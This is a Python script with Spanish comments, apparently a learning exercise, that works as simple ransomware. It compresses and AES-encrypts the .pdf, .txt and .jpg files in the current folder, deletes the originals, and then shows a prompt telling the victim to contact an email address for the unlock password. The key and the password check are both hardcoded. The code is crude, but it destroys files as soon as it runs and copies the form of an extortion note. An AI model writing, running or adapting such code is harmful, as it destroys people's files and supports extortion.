#=================================LIBRERIAS====================================#
import zipfile
import pyAesCrypt
import os 
import shutil

#=================================VARIABLES====================================#
correo = "AdministracionJuvenil@DrugsforLive.com"

#============Define la funcion que copia los archivos============#
def copy_file2():
    carpeta_origen = os.getcwd() # Define la carpeta de origen, bajo la libreria 
    carpeta_destino = os.path.join(os.path.expanduser("~"), "Desktop") # Aprovecha las variables del sistema para situarse en la carpeta Desktop, utilizando os
    # realizamos una bucle for donde la variable i recorra los directorios de la carpeta de origen 
    # iteramos a travez de cada archivo de la carpeta de origen
    for i in os.listdir(carpeta_origen): 
        # unimos y concatenamos las variables carpeta y origen
        archivo_origen = os.path.join(carpeta_origen, i)
        # se necesitan solo dos parametros para hacer funcionar la libreria shutil, realizamos una condicion
        if os.path.isfile(archivo_origen): 
            # shutil asigna la ruta mediante los parametros que entrego (S,D)
            # utilizamos la libreria shutil para copiar los archivos desde el archivo de origen al archivo de destino
            shutil.copy(archivo_origen, carpeta_destino) 

#==========Define la funcion que encripta los archivos y los convierte a un archivo .zip===#
def encriptado_file2():
    # Nombre del archivo ZIP que se creará
    zip_file_name = 'archivos_encriptados'

    # Contraseña para el archivo ZIP y encriptado AES (necesario para desencriptar)
    password = 'contraseña'

    # Verificar si el archivo cifrado ya existe, si existe evita machacar el archivo existente
    if os.path.exists(zip_file_name + '.aes'):
        print("\nNO LO INTENTES LOS ARCHIVOS YA ESTAN ENCRIPTADOS\n")
        return

    # Crear un objeto ZipFile
    # zipfile.ZIP_DEFLATED = La constante numérica para el método de compresión ZIP habitual.
    # para su correcto funcionamiento llama (nombre,archivo,tipo(r,w), metodo de compresion)
    zip_file = zipfile.ZipFile(zip_file_name + '.zip', 'w', zipfile.ZIP_DEFLATED)

    # Recorrer la carpeta en busca de archivos con las extensiones .pdf, .txt y jpg
    for archivo_nombre in os.listdir(os.getcwd()): # no olvidar listar los directorios si se escoje el parametro get (solo) no listara 
        archivo_ext = os.path.splitext(archivo_nombre)[1]
        if archivo_ext in ['.pdf', '.txt', '.jpg']:
            # Agregar el archivo a comprimir al archivo ZIP
            zip_file.write(archivo_nombre)

    # Cerrar el archivo ZIP
    zip_file.close()

    # Encriptar el archivo ZIP con una contraseña /no necesario MEJORAR CODIGO
    buffer_size = 64 * 1024
    # encriptamos con la siguiente secuencia de codigo (nombre, extension, - nombre, extension cifrada, contraseña, tamaño del buffer)
    pyAesCrypt.encryptFile(zip_file_name + '.zip', zip_file_name + '.aes', password, buffer_size)

    # Eliminar el archivo ZIP sin cifrar
    os.remove(zip_file_name + '.zip')

# TOMAR EN CUENTA QUE SI APARECE UN PRIMER PRINT DICIENDO QUE EL ARCHIVO EXISTE ESTOS PASOS NO SE EJECUTARAN Y EL PROGRAMA NOS DIO UN PROBLEMA

#==============Define la funcion que borra los archivos=====================# 
def borrar_archivos2():
    # Recorrer la carpeta en busca de archivos con las extensiones .pdf, .txt y jpg
    for archivo in os.listdir():
        if archivo.endswith('.pdf') or archivo.endswith('.txt') or archivo.endswith('.jpg'):
            # Si el archivo es de la extensión deseada, borrarlo
            os.remove(archivo)

#================DESENCRIPTAR====================#
def desencriptar_y_descomprimir():
    # Bucle: pide la contraseña - Se puede cerrar el programa!! 
    while True:
        contraseña = input("Si quieres ver tus archivos de nuevo, comunicate con "+ correo + " e indicar ahora la contraseña que te dio: ")
        if contraseña == "12345":
            print("\nContrase*a correcta. Desencriptando archivos. Have a nice day xD\n")
            break
        else:
            print("La contrase*a es incorrecta. Por favor ingrese la contrase*a nuevamente.\n ")

    # Nombre del archivo ZIP cifrado 
    zip_file_name = 'archivos_encriptados.aes'

    # Contraseña para el archivo ZIP / NO FUNCIONA
    password = 'contraseña'

    # Tamaño del búfer utilizado para descifrar el archivo
    buffer_size = 64 * 1024

    # Descifrar el archivo ZIP con la contraseña
    pyAesCrypt.decryptFile(zip_file_name, 'archivos_encriptados.zip', password, buffer_size)

    # Crear un objeto ZipFile
    zip_file = zipfile.ZipFile('archivos_encriptados.zip')

    # Extraer los archivos del archivo ZIP
    for archivo_nombre in zip_file.namelist():
        if os.path.splitext(archivo_nombre)[1] in ['.pdf', '.txt', '.jpg']:
            # Si el archivo es de la extensión deseada, extraerlo
            zip_file.extract(archivo_nombre)

    # Cerrar el archivo ZIP
    zip_file.close()

    # Eliminar el archivo ZIP descifrado y sin comprimir
    os.remove('archivos_encriptados.zip')
    os.remove(zip_file_name)

#============FUNCIONES============#
# copy_file2()        
encriptado_file2()
borrar_archivos2()
desencriptar_y_descomprimir()